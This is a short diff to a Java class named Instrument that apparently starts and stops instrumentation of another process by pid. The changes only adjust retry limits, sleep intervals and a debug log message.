@@ -15,7 +15,7 @@ import java.util.concurrent.TimeUnit;
 
 public class Instrument {
 	private static final String TAG = "Instrument";
-	private static final int MAX_KILLED = 3;
+	private static final int MAX_KILLED = 5;
 	private String proc_owner = null;
 	private String dex_dest = null;
 	private String proc;
@@ -133,7 +133,7 @@ public class Instrument {
 				}
 				return true;
 			}
-			Utils.sleep(5);
+			Utils.sleep(500);
 			diff_sec = (new Date().getTime() - start.getTime()) / 1000;
 		}
 		if (Cfg.DEBUG) {
@@ -214,9 +214,9 @@ public class Instrument {
 							}
 							if (!started) {
 								if (Cfg.DEBUG) {
-									Check.log(TAG + " (_startInstrumentation) sleep 5 secs "+proc);
+									Check.log(TAG + " (_startInstrumentation) sleep 1 secs "+proc);
 								}
-								Utils.sleep(5000);
+								Utils.sleep(1000);
 							}
 						}
 
@@ -285,7 +285,7 @@ public class Instrument {
 	public void stopInstrumentation() {
 		stopMonitor = true;
 		monitor = null;
-		int trials=5;
+		int trials=MAX_KILLED;
 		int pid_start = getProcessPid(proc,proc_owner);
 		int pid_stop = pid_start;
 
